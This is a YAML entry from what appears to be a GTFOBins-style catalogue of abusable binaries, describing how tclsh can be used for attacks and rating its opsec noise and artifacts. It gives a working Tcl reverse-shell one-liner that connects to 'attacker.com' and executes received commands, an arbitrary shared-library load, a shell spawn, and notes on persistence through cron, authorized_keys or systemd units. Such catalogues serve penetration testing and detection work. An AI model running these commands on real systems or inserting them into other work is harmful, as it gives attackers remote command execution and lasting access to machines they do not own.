---
name: tclsh
capabilities:
- exec
- spawn
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: |-
    tclsh
    load /path/to/lib.so x
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    tclsh
    set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: tclsh
references:
- https://gtfobins.github.io/gtfobins/tclsh/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
